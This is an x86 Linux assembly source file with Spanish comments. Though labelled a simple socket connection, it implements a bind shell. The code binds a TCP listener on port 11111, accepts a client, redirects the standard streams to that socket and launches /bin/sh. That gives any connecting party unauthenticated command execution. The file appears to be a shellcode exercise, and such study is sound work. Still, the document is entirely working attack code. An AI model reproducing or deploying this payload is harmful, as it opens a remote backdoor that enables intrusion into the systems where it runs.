;Conexion por medio de sockets
;Yeudiel Hernandez Torres

global _start
section .text

_start:

	mov eax, 102		; syscall 102 - socketcall
	mov ebx, 1		; socketcall type (sys_socket 1)
	push 0			; IPPROTO_IP = 0 (int)
	push 1			; SOCK_STREAM = 1 (int)
	push 2			; AF_INET = 2 (int)
	mov ecx, esp		; ptr to argument array
	int 0x80		; interrupcion de kernel
	mov edx, eax		; descriptor de archivo del socket
        mov eax, 102		; syscall 102 - socketcall
        mov ebx, 14		; socketcall type (sys_setsockopt 14)
        push 4                  ; sizeof socklen_t
        push esp                ; address of socklen_t - on the stack
        push 2                  ; SO_REUSEADDR = 2
        push 1                  ; SOL_SOCKET = 1
        push edx                ; descriptor de archivo de socket
        mov ecx, esp		; ptr to argument array
        int 0x80		; 
	mov eax, 102		; syscall 102 - socketcall
	mov ebx, 2		; socketcall type (sys_bind 2)

	push 0			; INADDR_ANY = 0 (uint32_t)
	push WORD 0x672b	; Aqui se especifica el puerto 11111 (uint16_t)

	push WORD 2		; AF_INET = 2 (unsigned short int)
	mov ecx, esp		; struct pointer
	push 16			; sockaddr struct size = sizeof(struct sockaddr) = 16 (socklen_t)
	push ecx		; sockaddr_in struct pointer (struct sockaddr *)
	push edx		; descript de archivo de scket (int)
	mov ecx, esp		; ptr argumento
	int 0x80		;
	mov eax, 102		; syscall 102 - socketcall
	mov ebx, 4		; socketcall type (sys_listen 4)
	push 0			; conexiones por tamaño
	push edx		; sockefd
	mov ecx, esp		; ptr argumento
	int 0x80		; 
        mov eax, 102            ; syscall 102 - socketcall
        mov ebx, 5              ; socketcall type (sys_accept 5)
	push 0			; informacion sobre le cliente
	push 0			; informacion sobre el cliente
	push edx		; socketfd
	mov ecx, esp		; puntero argumento
	int 0x80		; 
	mov edx, eax		; guardarndo socket fd del cliente
	mov eax, 63		; syscall 63 - dup2
	mov ebx, edx		; oldfd (client socket fd)
	mov ecx, 0		; stdin file descriptor
	int 0x80		; 
        mov eax, 63
        mov ecx, 1		; stdout file descriptor
        int 0x80
        mov eax, 63
        mov ecx, 2		; stderr file descriptor
        int 0x80
	mov eax, 11		; execve syscall
	push 0			; null byte
	push 0x68732f2f		; "//sh"
	push 0x6e69622f		; "/bin"
	mov ebx, esp		; ptr to "/bin//sh" string
	mov ecx, 0		; null ptr to argv
	mov edx, 0		; null ptr to envp
	int 0x80		; 
